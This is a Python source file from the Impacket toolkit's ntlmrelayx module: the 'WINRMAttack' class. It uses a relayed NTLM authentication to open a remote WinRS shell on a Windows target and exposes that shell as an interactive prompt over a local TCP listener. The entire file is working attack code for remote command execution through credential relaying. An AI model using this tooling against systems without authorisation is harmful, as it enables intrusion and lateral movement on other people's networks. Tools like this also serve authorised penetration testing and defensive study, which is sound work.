# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   WinRM Attack Class
#
# Authors:
#   Joe Mondloch (jmk@foofus.net)
#   Aurélien Chalot (@Defte_)

import cmd
import sys
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
from impacket.winrm import (
    SOAP_CONTENT_TYPE,
    build_winrs_command_request,
    build_winrs_create_request,
    build_winrs_delete_request,
    build_winrs_receive_request,
    envelope_to_bytes,
    iter_streams,
    parse_command_id,
    parse_shell_id,
    parse_wsman_response,
)

PROTOCOL_ATTACK_CLASS = "WINRMAttack"

class WinRMShell(cmd.Cmd):

    def __init__(self, tcp_shell, client):
        cmd.Cmd.__init__(self, stdin=tcp_shell.stdin, stdout=tcp_shell.stdout)

        sys.stdout = tcp_shell.stdout
        sys.stdin = tcp_shell.stdin
        sys.stderr = tcp_shell.stdout

        self.use_rawinput = False
        self.shell = tcp_shell
        self.client = client

        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []

        self.shell_id = None

        initiate_shell = envelope_to_bytes(build_winrs_create_request(timeout=20))

        headers = {
          "Content-Length": str(len(initiate_shell)),
          "Content-Type": SOAP_CONTENT_TYPE,
        }

        self.client.request("POST", "/wsman", headers=headers, body=initiate_shell)
        res = self.client.getresponse()
        response = res.read()

        try:
            self.shell_id = parse_shell_id(parse_wsman_response(response, res.status))
        except Exception:
            self.shell_id = None

    def emptyline(self):
        pass

    def onecmd(self, command):
        if not command.strip():
            return     

        if command.strip() == "exit":
            self.do_exit()

        execute_command_xml = envelope_to_bytes(build_winrs_command_request(self.shell_id, command))

        self.client.request("POST", "/wsman", headers={
            "Content-Length": str(len(execute_command_xml)),
            "Content-Type": SOAP_CONTENT_TYPE,
        }, body=execute_command_xml)

        response = self.client.getresponse()
        body = parse_wsman_response(response.read(), response.status)

        command_id = parse_command_id(body)
        receive_xml = envelope_to_bytes(build_winrs_receive_request(self.shell_id, command_id, keepalive=False))

        self.client.request("POST", "/wsman", headers={
            "Content-Length": str(len(receive_xml)),
            "Content-Type": SOAP_CONTENT_TYPE,
        }, body=receive_xml)

        response = self.client.getresponse()
        body = parse_wsman_response(response.read(), response.status)

        for stream_name, data in iter_streams(body):
            if not data:
                continue
            try:
                command_output = data.decode("utf-8", errors="ignore").strip()
            except Exception as e:
                LOG.error("Failed to decode %s output: %s", stream_name, e)
                continue

            if command_output:
                print(command_output)

    def do_exit(self):
        destroy_shell = envelope_to_bytes(build_winrs_delete_request(self.shell_id))

        headers = {
            "Content-Length": str(len(destroy_shell)),
            "Content-Type": SOAP_CONTENT_TYPE,
        }

        self.client.request("POST", "/wsman", headers=headers, body=destroy_shell)
        res = self.client.getresponse()   
        res.read()

        if self.shell is not None:
            self.shell.close()

        LOG.info("WinRM shell destroyed successfully. You can now leave the NC shell :)")
        return True

    def do_EOF(self, line):
        print("Bye!\n")
        return True

class WINRMAttack(ProtocolAttack):
    PLUGIN_NAMES = ["WINRMS"]

    def __init__(self, config, WINRMClient, username, target=None, relay_client=None):
        ProtocolAttack.__init__(self, config, WINRMClient, username, target, relay_client)
        self.tcp_shell = TcpShell()

    def run(self):
        LOG.info(f"Started interactive WinRMS shell via TCP on 127.0.0.1:{self.tcp_shell.port}") 
        self.tcp_shell.listen()
        shell = WinRMShell(self.tcp_shell, self.client)
        shell.cmdloop()
